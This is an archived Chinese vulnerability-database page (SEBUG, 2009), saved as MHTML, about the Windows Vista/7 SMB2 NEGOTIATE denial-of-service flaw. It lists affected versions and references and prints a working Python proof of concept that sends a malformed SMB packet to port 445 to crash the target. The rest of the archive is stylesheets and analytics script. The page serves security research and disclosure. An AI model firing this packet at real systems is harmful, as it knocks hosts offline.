@@ -1,0 +1,638 @@
+From: <ÓÉ Windows Internet Explorer 7 ±£´æ>
+Subject: =?gb2312?B?MTIyNzI6IE1pY3Jvc29mdCBXaW5kb3dzIFNNQjIgJ19TbWIyVmFsaQ==?=
+	=?gb2312?B?ZGF0ZVByb3ZpZGVyQ2FsbGJhY2soKSe+3L74t/7O8cKptrQ=?=
+Date: Sat, 17 Apr 2010 21:38:07 +0800
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	type="text/html";
+	boundary="----=_NextPart_000_0000_01CADE76.44EC8960"
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5579
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0000_01CADE76.44EC8960
+Content-Type: text/html;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://sebug.net/vulndb/12272/
+
+=EF=BB=BF<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" =
+"http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<HTML><HEAD><TITLE>12272: Microsoft Windows SMB2 =
+'_Smb2ValidateProviderCallback()'=E6=8B=92=E7=BB=9D=E6=9C=8D=E5=8A=A1=E6=BC=
+=8F=E6=B4=9E</TITLE>
+<META charset=3Dutf-8>
+<META=20
+content=3D"Microsoft Windows SMB2 =
+'_Smb2ValidateProviderCallback()'=E6=8B=92=E7=BB=9D=E6=9C=8D=E5=8A=A1=E6=BC=
+=8F=E6=B4=9E,windows,=E6=8B=92=E7=BB=9D=E6=9C=8D=E5=8A=A1,sebug=E5=AE=89=E5=
+=85=A8=E6=BC=8F=E6=B4=9E=E4=BF=A1=E6=81=AF=E5=BA=93"=20
+name=3Ddescription><LINK=20
+href=3D"http://cache.ssvdb.com/640564311/aa810382f2dcdcea.css" =
+rel=3Dstylesheet><!--[if IE]><LINK=20
+href=3D"http://cache.ssvdb.com/640564311/style_ie.css"=20
+rel=3Dstylesheet><![endif]--><LINK href=3D"http://sebug.net/rss.xml"=20
+type=3Dapplication/rss+xml rel=3Dalternate>
+<META content=3D"MSHTML 6.00.6000.17023" name=3DGENERATOR></HEAD>
+<BODY>
+<DIV id=3Dmain><SPAN class=3Dtopb><A title=3D=E7=99=BB=E5=BD=95 =
+href=3D"http://sebug.net/login/">=E7=99=BB=E5=BD=95</A>=20
+</SPAN>
+<DIV id=3Dheader><A =
+title=3DSEBUG=E5=AE=89=E5=85=A8=E6=BC=8F=E6=B4=9E=E4=BF=A1=E6=81=AF=E5=BA=
+=93,=E5=85=8D=E8=B4=B9=E6=BC=8F=E6=B4=9E=E4=BF=A1=E6=81=AF=E5=B9=B3=E5=8F=
+=B0=20
+href=3D"http://sebug.net/">SEBUG=E5=AE=89=E5=85=A8=E6=BC=8F=E6=B4=9E=E4=BF=
+=A1=E6=81=AF=E5=BA=93</A></DIV>
+<DIV id=3Dmenubar>
+<UL class=3Dmenus>
+  <LI><A =
+title=3DSEBUG=E5=AE=89=E5=85=A8=E6=BC=8F=E6=B4=9E=E4=BF=A1=E6=81=AF=E5=BA=
+=93 href=3D"http://sebug.net/">Search</A> </LI>
+  <LI><A title=3D=E6=BC=8F=E6=B4=9E=E4=BF=A1=E6=81=AF =
+href=3D"http://sebug.net/vuldb/">Vulndb</A> </LI>
+  <LI><A title=3D=E5=8E=82=E5=95=86=E7=9B=AE=E5=BD=95 =
+href=3D"http://sebug.net/appdir/">Appdir</A> </LI>
+  <LI class=3Dmenu>
+  <UL>
+    <LI><A href=3D"http://sebug.net/vulndb/12272/#">More &gt;&gt;<!--[if =
+IE 7]><!--></A><!--<![endif]--><!--[if lte IE =
+6]><table><tr><td><![endif]-->=20
+
+    <UL>
+      <LI><A title=3D=E5=AE=89=E5=85=A8=E6=96=87=E6=A1=A3 =
+href=3D"http://sebug.net/paper/" target=3Dnw>Papers</A>=20
+</LI>
+      <LI><A title=3D=E8=B6=8B=E5=8A=BF=E5=88=86=E6=9E=90 =
+href=3D"http://sebug.net/chart/" target=3Dnw>Chart</A> </LI>
+      <LI><A title=3D"SEBUG RPC Server" href=3D"http://sebug.net/un/" =
+target=3Dnw>RPC=20
+      Server</A> </LI>
+      <LI><A title=3D"SEBUG RSS" href=3D"http://sebug.net/rss.xml" =
+target=3Dnw>SEBUG=20
+      RSS</A> </LI>
+      <LI><A title=3DTwitter href=3D"http://twitter.com/sebug"=20
+      target=3Dnw>@Twitter</A> </LI></UL><!--[if lte IE =
+6]></td></tr></table></a><![endif]--></LI></UL></LI></UL></DIV>
+<DIV id=3Dcontent>
+<H2 class=3Dpost-title>Microsoft Windows SMB2=20
+'_Smb2ValidateProviderCallback()'=E6=8B=92=E7=BB=9D=E6=9C=8D=E5=8A=A1=E6=BC=
+=8F=E6=B4=9E</H2>
+<DIV class=3Dpost-vuln>SSV ID:<A=20
+title=3D"Microsoft Windows SMB2 =
+'_Smb2ValidateProviderCallback()'=E6=8B=92=E7=BB=9D=E6=9C=8D=E5=8A=A1=E6=BC=
+=8F=E6=B4=9E"=20
+href=3D"http://sebug.net/vulndb/12272/" target=3D_blank>12272</A></DIV>
+<DIV class=3Dpost-vuln>SEBUG-Appdir:<A title=3D"Microsoft Windows"=20
+href=3D"http://sebug.net/appdir/Microsoft+Windows/">Microsoft =
+Windows</A></DIV>
+<DIV =
+class=3Dpost-vuln>=E5=8F=91=E5=B8=83=E6=97=B6=E9=97=B4:2009-09-08</DIV>
+<DIV class=3Dpost-hr>=E5=BD=B1=E5=93=8D=E7=89=88=E6=9C=AC:</DIV>
+<DIV class=3Dpost-content><PRE>Microsoft Windows Vista x64 Edition SP2
+Microsoft Windows Vista x64 Edition SP1
+Microsoft Windows Vista x64 Edition 0
+Microsoft Windows Vista Ultimate 64-bit edition SP2
+Microsoft Windows Vista Ultimate 64-bit edition SP1
+Microsoft Windows Vista Ultimate 64-bit edition 0
+Microsoft Windows Vista Home Premium 64-bit edition SP2
+Microsoft Windows Vista Home Premium 64-bit edition SP1
+Microsoft Windows Vista Home Premium 64-bit edition 0
+Microsoft Windows Vista Home Basic 64-bit edition SP2
+Microsoft Windows Vista Home Basic 64-bit edition SP1
+Microsoft Windows Vista Home Basic 64-bit edition 0
+Microsoft Windows Vista Enterprise 64-bit edition SP2
+Microsoft Windows Vista Enterprise 64-bit edition SP1
+Microsoft Windows Vista Enterprise 64-bit edition 0
+Microsoft Windows Vista Business 64-bit edition SP2
+Microsoft Windows Vista Business 64-bit edition SP1
+Microsoft Windows Vista Business 64-bit edition 0
+Microsoft Windows Vista Ultimate SP2
+Microsoft Windows Vista Ultimate SP1
+Microsoft Windows Vista Ultimate
+Microsoft Windows Vista Home Premium SP2
+Microsoft Windows Vista Home Premium SP1
+Microsoft Windows Vista Home Premium
+Microsoft Windows Vista Home Basic SP2
+Microsoft Windows Vista Home Basic SP1
+Microsoft Windows Vista Home Basic
+Microsoft Windows Vista Enterprise SP2
+Microsoft Windows Vista Enterprise SP1
+Microsoft Windows Vista Enterprise
+Microsoft Windows Vista Business SP2
+Microsoft Windows Vista Business SP1
+Microsoft Windows Vista Business
+Microsoft Windows 7 for x64-based Systems
+Microsoft Windows 7 for Itanium-based Systems
+Microsoft Windows 7 for 32-bit Systems
+Microsoft Windows 7 beta</PRE></DIV>
+<DIV class=3Dpost-hr>=E6=BC=8F=E6=B4=9E=E6=8F=8F=E8=BF=B0:</DIV>
+<DIV class=3Dpost-content><PRE>Bugraq ID: 36299
+
+Microsoft =
+Windows=E6=98=AF=E4=B8=80=E6=AC=BE=E6=B5=81=E8=A1=8C=E7=9A=84=E6=93=8D=E4=
+=BD=9C=E7=B3=BB=E7=BB=9F=E3=80=82
+Microsoft Windows Vista=E5=92=8CWindows =
+7=E5=8C=85=E5=90=AB=E7=9A=84SMB2=E7=BB=84=E4=BB=B6=E4=B8=8D=E6=AD=A3=E7=A1=
+=AE=E5=A4=84=E7=90=86=E7=94=A8=E6=88=B7=E6=8F=90=E4=BA=A4=E7=9A=84=E8=AF=B7=
+=E6=B1=82=EF=BC=8C=E8=BF=9C=E7=A8=8B=E6=94=BB=E5=87=BB=E8=80=85=E5=8F=AF=E4=
+=BB=A5=E5=88=A9=E7=94=A8=E6=BC=8F=E6=B4=9E=E4=BD=BF=E7=9B=AE=E6=A0=87=E7=B3=
+=BB=E7=BB=9F=E8=A7=A6=E5=8F=91=E8=93=9D=E5=B1=8F=E3=80=82
+SRV2.SYS=E9=A9=B1=E5=8A=A8=E4=B8=8D=E6=AD=A3=E7=A1=AE=E5=A4=84=E7=90=86=E5=
+=8F=91=E9=80=81=E7=BB=99NEGOTIATE PROTOCOL =
+REQUEST=E5=8A=9F=E8=83=BD=E7=9A=84=E7=95=B8=E5=BD=A2SMB=E5=A4=B4=E5=AD=97=
+=E6=AE=B5=E6=95=B0=E6=8D=AE=EF=BC=8CNEGOTIATE PROTOCOL =
+REQUEST=E6=98=AF=E5=AE=A2=E6=88=B7=E7=AB=AF=E5=8F=91=E9=80=81=E7=BB=99SMB=
+=E6=9C=8D=E5=8A=A1=E5=99=A8=E7=9A=84=E7=AC=AC=E4=B8=80=E4=B8=AASMB=E6=9F=A5=
+=E8=AF=A2=EF=BC=8C=E7=94=A8=E4=BA=8E=E8=AF=86=E5=88=ABSMB=E8=AF=AD=E8=A8=80=
+=E5=B9=B6=E7=94=A8=E4=BA=8E=E4=B9=8B=E5=90=8E=E7=9A=84=E9=80=9A=E4=BF=A1=E3=
+=80=82
+=E8=BF=9C=E7=A8=8B=E6=94=BB=E5=87=BB=E8=80=85=E5=8F=AF=E4=BB=A5=E6=9E=84=E5=
+=BB=BAProcess Id =
+High=E5=A4=B4=E5=AD=97=E6=AE=B5=E4=B8=AD=E5=8C=85=E5=90=AB=E6=9C=89=E2=80=
+=9C&amp;=E2=80=9D=E5=AD=97=E7=AC=A6=E7=9A=84SMB=E6=8A=A5=E6=96=87=E5=B9=B6=
+=E5=8F=91=E9=80=81=E7=BB=99=E5=8F=97=E5=BD=B1=E5=93=8D=E7=B3=BB=E7=BB=9F=EF=
+=BC=8C=E5=8F=AF=E5=AF=BC=E8=87=B4=E7=B3=BB=E7=BB=9F=E8=93=9D=E5=B1=8F=E6=AD=
+=BB=E6=9C=BA=EF=BC=8C=E9=80=A0=E6=88=90=E6=8B=92=E7=BB=9D=E6=9C=8D=E5=8A=A1=
+=E6=94=BB=E5=87=BB=E3=80=82
+=E6=AD=A4=E6=BC=8F=E6=B4=9E=E6=97=A0=E9=9C=80=E9=AA=8C=E8=AF=81=E4=BA=A4=E4=
+=BA=92=E3=80=82</PRE></DIV>
+<DIV><SPAN class=3Dpost-vuln>&lt;*=E5=8F=82=E8=80=83</SPAN>=20
+<BLOCKQUOTE><A href=3D"http://blog.48bits.com/?p=3D510#more-510"=20
+  target=3D_blank>http://blog.48bits.com/?p=3D510#more-510</A><BR><A=20
+  =
+href=3D"http://www.microsoft.com/technet/security/advisory/975497.mspx"=20
+  =
+target=3D_blank>http://www.microsoft.com/technet/security/advisory/975497=
+.mspx</A><BR><A=20
+  =
+href=3D"http://blogs.technet.com/msrc/archive/2009/09/08/microsoft-securi=
+ty-advisory-975497-released.aspx"=20
+  =
+target=3D_blank>http://blogs.technet.com/msrc/archive/2009/09/08/microsof=
+t-security-advisory-975497-released.aspx</A><BR><A=20
+  =
+href=3D"http://www.reversemode.com/index.php?option=3Dcom_content&amp;tas=
+k=3Dview&amp;id=3D64&amp;Itemid=3D1"=20
+  =
+target=3D_blank>http://www.reversemode.com/index.php?option=3Dcom_content=
+&amp;task=3Dview&amp;id=3D64&amp;Itemid=3D1</A><BR><A=20
+  =
+href=3D"http://g-laurent.blogspot.com/2009/09/windows-vista7-smb20-negoti=
+ate-protocol.html"=20
+  =
+target=3D_blank>http://g-laurent.blogspot.com/2009/09/windows-vista7-smb2=
+0-negotiate-protocol.html</A></BLOCKQUOTE><SPAN=20
+class=3Dpost-vuln>*&gt;</SPAN></DIV>
+<DIV class=3Dpost-hr>=E6=B5=8B=E8=AF=95=E6=96=B9=E6=B3=95:</DIV>
+<DIV class=3Dexp-content><SPAN=20
+class=3Dbugexp_url>[www.sebug.net]<BR>=E6=9C=AC=E7=AB=99=E6=8F=90=E4=BE=9B=
+=E7=A8=8B=E5=BA=8F(=E6=96=B9=E6=B3=95)=E5=8F=AF=E8=83=BD=E5=B8=A6=E6=9C=89=
+=E6=94=BB=E5=87=BB=E6=80=A7,=E4=BB=85=E4=BE=9B=E5=AE=89=E5=85=A8=E7=A0=94=
+=E7=A9=B6=E4=B8=8E=E6=95=99=E5=AD=A6=E4=B9=8B=E7=94=A8,=E9=A3=8E=E9=99=A9=
+=E8=87=AA=E8=B4=9F!</SPAN><PRE>#!/usr/bin/python
+# When SMB2.0 recieve a "&amp;" char in the "Process Id High" SMB header =
+field it dies with a
+# PAGE_FAULT_IN_NONPAGED_AREA
+from socket import socket
+from time import sleep
+host =3D "IP_ADDR", 445
+buff =3D (
+"\x00\x00\x00\x90" # Begin SMB header: Session message
+"\xff\x53\x4d\x42" # Server Component: SMB
+"\x72\x00\x00\x00" # Negociate Protocol
+"\x00\x18\x53\xc8" # Operation 0x18 &amp; sub 0xc853
+"\x00\x26"# Process ID High: --&gt; :) normal value should be "\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
+"\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54"
+"\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31"
+"\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"
+"\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57"
+"\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61"
+"\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c"
+"\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c"
+"\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e"
+"\x30\x30\x32\x00"
+)
+s =3D socket()
+s.connect(host)
+s.send(buff)
+s.close()</PRE></DIV>
+<DIV class=3Dpost-hr>SEBUG=E5=AE=89=E5=85=A8=E5=BB=BA=E8=AE=AE:</DIV>
+<DIV =
+class=3Dpost-content><PRE>=E7=9B=AE=E5=89=8D=E6=B2=A1=E6=9C=89=E8=A7=A3=E5=
+=86=B3=E6=96=B9=E6=A1=88=E6=8F=90=E4=BE=9B=EF=BC=9A
+http://www.microsoft.com/windows/windows-7/
+http://www.microsoft.com/windows/products/windowsvista/default.mspx</PRE>=
+</DIV>
+<DIV class=3Dpost-sebug>// sebug.net [2009-09-11]</DIV></DIV>
+<DIV id=3Dfooter>=C2=A92006 - 2010 SEBUG Security vulnerability =
+Database<BR><A=20
+title=3D=E9=9A=90=E7=A7=81=E6=94=BF=E7=AD=96 =
+href=3D"http://sebug.net/about/About.html#Privacy">=E9=9A=90=E7=A7=81=E6=94=
+=BF=E7=AD=96</A> | <A=20
+title=3D=E5=90=88=E4=BD=9C=E4=BC=99=E4=BC=B4 =
+href=3D"http://sebug.net/about/cooperate.html">=E5=90=88=E4=BD=9C=E4=BC=99=
+=E4=BC=B4</A> | <A title=3D=E5=85=B3=E4=BA=8E=E6=88=91=E4=BB=AC=20
+href=3D"http://sebug.net/about/About.html">=E5=85=B3=E4=BA=8E=E6=88=91=E4=
+=BB=AC</A></DIV></DIV><!-- analytics --><SPAN=20
+style=3D"DISPLAY: none">
+<SCRIPT language=3DJavaScript=20
+src=3D"http://s48.cnzz.com/stat.php?id=3D355990&amp;web_id=3D355990"=20
+charset=3Dgb2312></SCRIPT>
+<!-- analytics --></SPAN></BODY></HTML>
+
+------=_NextPart_000_0000_01CADE76.44EC8960
+Content-Type: text/css;
+	charset="gb2312"
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://cache.ssvdb.com/640564311/aa810382f2dcdcea.css
+
+* {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: =
+0px; PADDING-TOP: 0px
+}
+BODY {
+	BACKGROUND: #eee; FONT: 13px Tahoma,Arial,sans-serif; COLOR: #000
+}
+H1 {
+	FONT-SIZE: 22px
+}
+H2 {
+	FONT-SIZE: 18px
+}
+H3 {
+	FONT-SIZE: 14px
+}
+TEXTAREA {
+	PADDING-RIGHT: 1px; PADDING-LEFT: 1px; FONT-SIZE: 12px; PADDING-BOTTOM: =
+1px; PADDING-TOP: 2px
+}
+BUTTON {
+	PADDING-RIGHT: 6px; PADDING-LEFT: 6px; PADDING-BOTTOM: 3px; =
+PADDING-TOP: 3px
+}
+BLOCKQUOTE {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 12px; PADDING-BOTTOM: 0px; =
+PADDING-TOP: 0px
+}
+INPUT {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-SIZE: 16px; PADDING-BOTTOM: =
+2px; PADDING-TOP: 2px; HEIGHT: 20px
+}
+PRE {
+	WORD-WRAP: break-word
+}
+DIV.pages {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; RIGHT: -20px; PADDING-BOTTOM: =
+3px; PADDING-TOP: 3px; POSITION: relative; TEXT-ALIGN: right
+}
+DIV.pages A {
+	PADDING-RIGHT: 3px; BACKGROUND-POSITION: 50% bottom; PADDING-LEFT: 3px; =
+PADDING-BOTTOM: 3px; MARGIN: 0px 3px; PADDING-TOP: 3px; TEXT-DECORATION: =
+none
+}
+FIELDSET {
+	BORDER-TOP: #ccc 1px solid; MARGIN: 5px 0px; BORDER-RIGHT-STYLE: none; =
+BORDER-LEFT-STYLE: none; BORDER-BOTTOM-STYLE: none
+}
+LEGEND {
+	PADDING-RIGHT: 3px; PADDING-LEFT: 3px; FONT-WEIGHT: 700; FONT-SIZE: =
+16px; PADDING-BOTTOM: 0px; MARGIN: 0px 0px 5px; COLOR: #036; =
+PADDING-TOP: 0px
+}
+#main {
+	BORDER-RIGHT: #ddd 1px solid; BORDER-TOP: #ddd 1px solid; BACKGROUND: =
+#fff; MARGIN: 0px auto; BORDER-LEFT: #ddd 1px solid; WIDTH: 950px; =
+BORDER-BOTTOM: #ddd 1px solid; TEXT-ALIGN: left
+}
+#header {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 20px; PADDING-BOTTOM: 8px; =
+PADDING-TOP: 15px
+}
+#header A {
+	DISPLAY: block; BACKGROUND: url(./images/top_logo.jpg) no-repeat; =
+WIDTH: 300px; TEXT-INDENT: -500px; HEIGHT: 42px
+}
+#title {
+	DISPLAY: block; FONT-WEIGHT: 900
+}
+#desc {
+	FONT-SIZE: 12px; MARGIN: 5px 0px 0px 3px
+}
+#menubar {
+	FONT-SIZE: 11px; BACKGROUND: #67ace5; HEIGHT: 25px
+}
+#menubar UL.menus LI {
+	BORDER-RIGHT: #fff 1px solid; FLOAT: left; LIST-STYLE-TYPE: none
+}
+#menubar UL.menus LI A {
+	PADDING-RIGHT: 15px; DISPLAY: block; PADDING-LEFT: 15px; BACKGROUND: =
+#67ace5; PADDING-BOTTOM: 0px; COLOR: #fff; LINE-HEIGHT: 25px; =
+PADDING-TOP: 0px; TEXT-DECORATION: none
+}
+#menubar UL.menus LI.current_page_item A {
+	FONT-WEIGHT: 700; BACKGROUND: #286ea0
+}
+#menubar UL.menus LI A:hover {
+	BACKGROUND: #4281b7
+}
+#content {
+	BACKGROUND: #fff; FLOAT: left; MARGIN: 5px 25px; WIDTH: 94%
+}
+#footer {
+	CLEAR: both; PADDING-RIGHT: 0px; BORDER-TOP: #ccc 1px dashed; =
+PADDING-LEFT: 0px; FONT-SIZE: 12px; PADDING-BOTTOM: 15px; COLOR: #666; =
+PADDING-TOP: 15px; TEXT-ALIGN: center
+}
+.menu {
+	FONT-SIZE: 11px; POSITION: relative
+}
+.menu LI {
+	FLOAT: left; POSITION: relative
+}
+.menu UL UL {
+	VISIBILITY: hidden; POSITION: absolute; TOP: auto
+}
+.menu TABLE {
+	POSITION: absolute; TOP: auto
+}
+.menu UL LI:hover UL {
+	VISIBILITY: visible
+}
+.menu UL A:hover UL {
+	VISIBILITY: visible
+}
+.menu A {
+	DISPLAY: block; MARGIN-RIGHT: -1px; TEXT-ALIGN: left
+}
+.menu UL UL LI {
+	CLEAR: both; TEXT-ALIGN: left
+}
+.menu UL UL LI A {
+	DISPLAY: block; WIDTH: 70px; BORDER-BOTTOM: #fff 1px solid
+}
+.fixed {
+	CLEAR: both
+}
+.clear {
+	CLEAR: both
+}
+.post-title {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: 700; MARGIN-BOTTOM: =
+5px; PADDING-BOTTOM: 12px; PADDING-TOP: 12px; BORDER-BOTTOM: #ccc 1px =
+solid
+}
+.post-vuln {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: 700; =
+PADDING-BOTTOM: 3px; PADDING-TOP: 3px
+}
+.post-sebug {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 5px; =
+PADDING-TOP: 5px
+}
+.post-content {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 12px; PADDING-BOTTOM: 5px; =
+PADDING-TOP: 5px
+}
+.post-hr {
+	PADDING-RIGHT: 8px; PADDING-LEFT: 8px; FONT-WEIGHT: 700; =
+PADDING-BOTTOM: 4px; MARGIN: 8px 0px; BORDER-LEFT: #67ace5 5px solid; =
+PADDING-TOP: 4px
+}
+.exp-content {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 10px; PADDING-BOTTOM: 0px; =
+PADDING-TOP: 0px
+}
+.posttitle {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 5px; PADDING-BOTTOM: 2px; FONT: bold =
+12px verdana; PADDING-TOP: 2px
+}
+.indexseach {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 120px; =
+PADDING-TOP: 120px; TEXT-ALIGN: center
+}
+.indexseach TABLE {
+	PADDING-RIGHT: 230px; PADDING-LEFT: 230px; PADDING-BOTTOM: 0px; =
+PADDING-TOP: 0px
+}
+.li_list {
+	CLEAR: both; PADDING-RIGHT: 0px; PADDING-LEFT: 12px; PADDING-BOTTOM: =
+0px; PADDING-TOP: 0px
+}
+.li_list LI {
+	CLEAR: both; PADDING-RIGHT: 3px; PADDING-LEFT: 3px; PADDING-BOTTOM: =
+3px; PADDING-TOP: 3px; LIST-STYLE-TYPE: square; HEIGHT: 17px
+}
+.li_more {
+	CLEAR: both; PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: =
+2px; MARGIN: 5px 0px; PADDING-TOP: 0px; TEXT-ALIGN: right
+}
+.li_time {
+	PADDING-RIGHT: 25px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; =
+PADDING-TOP: 0px
+}
+.tabberlive .tabbertabhide {
+	DISPLAY: none
+}
+.tabberlive .tabbertab H2 {
+	DISPLAY: none
+}
+.tabberlive .tabbertab H3 {
+	DISPLAY: none
+}
+DIV.pages SPAN.disabled {
+	DISPLAY: none
+}
+.bugexp_info {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 10px; PADDING-BOTTOM: 0px; =
+PADDING-TOP: 0px
+}
+.bugexp_url {
+	COLOR: #ce0700
+}
+.tags {
+	FONT-WEIGHT: 700; COLOR: #f00
+}
+.it_search {
+	PADDING-RIGHT: 1px; PADDING-LEFT: 1px; FONT-SIZE: 17px; PADDING-BOTTOM: =
+1px; PADDING-TOP: 2px; HEIGHT: 22px
+}
+.topb {
+	PADDING-RIGHT: 3px; PADDING-LEFT: 3px; FONT-SIZE: 12px; FLOAT: right; =
+PADDING-BOTTOM: 3px; MARGIN: 3px; PADDING-TOP: 3px
+}
+.list_other {
+	PADDING-RIGHT: 3px; PADDING-LEFT: 3px; FLOAT: right; PADDING-BOTTOM: =
+3px; MARGIN: 3px; PADDING-TOP: 3px
+}
+.kmyad {
+	PADDING-RIGHT: 5px; PADDING-LEFT: 5px; FLOAT: right; PADDING-BOTTOM: =
+5px; MARGIN: 10px 5px 0px 0px; PADDING-TOP: 5px
+}
+.type-info {
+	CLEAR: both; PADDING-RIGHT: 12px; PADDING-LEFT: 8px; PADDING-BOTTOM: =
+0px; PADDING-TOP: 0px
+}
+.type-info PRE {
+	BORDER-RIGHT: #ddd 1px solid; PADDING-RIGHT: 5px; BORDER-TOP: #ddd 1px =
+solid; PADDING-LEFT: 5px; BACKGROUND: #f3f3f3; PADDING-BOTTOM: 5px; =
+MARGIN: 0px; BORDER-LEFT: #ddd 1px solid; LINE-HEIGHT: 20px; =
+PADDING-TOP: 5px; BORDER-BOTTOM: #ddd 1px solid
+}
+.lists {
+	FLOAT: left; MARGIN: 0px auto; WIDTH: 100%; LIST-STYLE-TYPE: none
+}
+.lists UL {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; LIST-STYLE-POSITION: outside; =
+FLOAT: left; PADDING-BOTTOM: 0px; MARGIN: 20px 10px 10px 20px; WIDTH: =
+100%; PADDING-TOP: 0px; LIST-STYLE-TYPE: none
+}
+.lists UL LI {
+	DISPLAY: inline; FLOAT: left; MARGIN: 0px; WIDTH: 24.5%; LINE-HEIGHT: =
+24px
+}
+.applists {
+	FLOAT: left; MARGIN: 10px 0px; WIDTH: 100%; BORDER-BOTTOM: #ccc 1px =
+dashed; LIST-STYLE-TYPE: none
+}
+.applists UL {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; LIST-STYLE-POSITION: outside; =
+FLOAT: left; PADDING-BOTTOM: 0px; MARGIN: 5px 10px 20px 20px; WIDTH: =
+100%; PADDING-TOP: 0px; LIST-STYLE-TYPE: none
+}
+.applists UL LI {
+	DISPLAY: inline; FLOAT: left; MARGIN: 0px; WIDTH: 25%; LINE-HEIGHT: =
+24px
+}
+.return_top {
+	PADDING-LEFT: 820px; FONT-SIZE: 10px; VERTICAL-ALIGN: bottom; align: =
+right
+}
+.return_top A {
+	COLOR: #666; TEXT-DECORATION: none
+}
+.return_en {
+	FONT-WEIGHT: 900; FONT-SIZE: 22px; VERTICAL-ALIGN: top; COLOR: #666; =
+align: left
+}
+.return_Nav {
+	PADDING-LEFT: 5px; FONT-WEIGHT: bold; FONT-SIZE: 15px; align: left
+}
+.return_Nadir {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: 900; FONT-SIZE: =
+15px; PADDING-BOTTOM: 15px; PADDING-TOP: 20px
+}
+.partnerlogo {
+	PADDING-RIGHT: 7px; PADDING-LEFT: 30px; PADDING-BOTTOM: 7px; =
+PADDING-TOP: 7px
+}
+.partnerlogo IMG {
+	BORDER-RIGHT: #ccc 1px solid; PADDING-RIGHT: 1px; BORDER-TOP: #ccc 1px =
+solid; PADDING-LEFT: 1px; PADDING-BOTTOM: 1px; MARGIN: 1px; BORDER-LEFT: =
+#ccc 1px solid; PADDING-TOP: 1px; BORDER-BOTTOM: #ccc 1px solid
+}
+.linksno {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 30px; FLOAT: left; PADDING-BOTTOM: =
+0px; MARGIN: 1px 10px 2px 0px; WIDTH: 100%; PADDING-TOP: 0px; =
+LIST-STYLE-TYPE: none
+}
+.linksno UL {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; LIST-STYLE-POSITION: outside; =
+FLOAT: left; PADDING-BOTTOM: 0px; MARGIN: 1px 10px 2px 2px; WIDTH: 100%; =
+PADDING-TOP: 0px; LIST-STYLE-TYPE: none
+}
+.linksno UL LI {
+	DISPLAY: inline; FLOAT: left; MARGIN: 0px; WIDTH: 10%; LINE-HEIGHT: =
+24px
+}
+.aboutinfo {
+	PADDING-RIGHT: 7px; PADDING-LEFT: 30px; PADDING-BOTTOM: 7px; =
+PADDING-TOP: 7px
+}
+
+------=_NextPart_000_0000_01CADE76.44EC8960
+Content-Type: text/css;
+	charset="gb2312"
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://cache.ssvdb.com/640564311/style_ie.css
+
+PRE {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: =
+0px; OVERFLOW: auto; PADDING-TOP: 0px; WORD-WRAP: break-word
+}
+
+------=_NextPart_000_0000_01CADE76.44EC8960
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://s48.cnzz.com/stat.php?id=355990&web_id=355990
+
+function gv_cnzz(of){=0A=
+	var es =3D document.cookie.indexOf(";",of);=0A=
+	if(es=3D=3D-1) es=3Ddocument.cookie.length;=0A=
+	return unescape(document.cookie.substring(of,es));=0A=
+}=0A=
+function gc_cnzz(n){=0A=
+	var arg=3Dn+"=3D";=0A=
+	var alen=3Darg.length;=0A=
+	var clen=3Ddocument.cookie.length;=0A=
+	var i=3D0;=0A=
+	while(i<clen){=0A=
+	var j=3Di+alen;=0A=
+	if(document.cookie.substring(i,j)=3D=3Darg) return gv_cnzz(j);=0A=
+	i=3Ddocument.cookie.indexOf(" ",i)+1;=0A=
+	if(i=3D=3D0)	break;=0A=
+	}=0A=
+	return -1;=0A=
+}=0A=
+var cnzz_ed=3Dnew Date();=0A=
+var cnzz_now=3DparseInt(cnzz_ed.getTime());=0A=
+var =
+cnzz_data=3D'&r=3D'+escape(document.referrer.substr(0,512))+'&lg=3D'+esca=
+pe(navigator.systemLanguage)+'&ntime=3D0.87608700 1271508042';=0A=
+var cnzz_a=3Dgc_cnzz("cnzz_a355990");=0A=
